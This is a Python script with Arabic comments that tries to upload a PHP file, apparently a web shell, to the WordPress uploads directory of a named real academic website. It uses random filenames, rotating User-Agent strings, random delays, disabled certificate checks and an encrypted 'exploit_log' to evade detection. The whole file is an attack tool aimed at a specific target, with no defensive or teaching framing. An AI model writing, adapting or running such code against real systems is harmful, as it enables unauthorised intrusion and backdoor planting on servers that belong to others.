import requests
import random
import string
import time
import os
from cryptography.fernet import Fernet

# مولد اسم عشوائي
def random_filename(extension=".php"):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(10)) + extension

# إعداد التشفير
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# تسجيل النشاطات
def log_activity(data):
    encrypted_data = cipher_suite.encrypt(data.encode())
    with open("exploit_log.txt", "ab") as log_file:
        log_file.write(encrypted_data + b"\n")

# إعداد تأخير عشوائي
def random_delay():
    time.sleep(random.uniform(1, 5))

# محاولة إعادة الاتصال
def retry_request(func, retries=3):
    for attempt in range(retries):
        try:
            return func()
        except requests.exceptions.RequestException as e:
            log_activity(f"محاولة {attempt+1} فشلت: {e}")
            time.sleep(2)  # تأخير قبل إعادة المحاولة
    print("فشلت كل المحاولات")
    return None

# تحميل ملف الاستغلال
def upload_exploit_file(url, session, file_path):
    if not os.path.exists(file_path):
        print("الملف غير موجود:", file_path)
        return
    
    file_name = random_filename()
    with open(file_path, 'rb') as file:
        files = {'file': (file_name, file, 'application/x-php')}
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        ]
        headers = {
            'User-Agent': random.choice(user_agents),
            'Referer': url,
        }
        
        # تأخير
        random_delay()
        
        # رفع الملف مع تكرار المحاولات
        response = retry_request(lambda: session.post(f"{url}/wp-content/uploads", files=files, headers=headers, verify=False))
        
        if response and response.status_code == 200:
            check_url = f"{url}/wp-content/uploads/{file_name}"
            log_activity(f"تم رفع الملف بنجاح إلى: {check_url}")
            print("تم رفع الملف بنجاح:", check_url)
        else:
            log_activity("فشل تحميل الملف.")
            print("فشل تحميل الملف.")

# إعداد الجلسة واستخدام الأداة
url = "https://oimt.ac.in"
session = requests.Session()
file_path = "/sec/root/charon_tool/313.php"
upload_exploit_file(url, session, file_path)
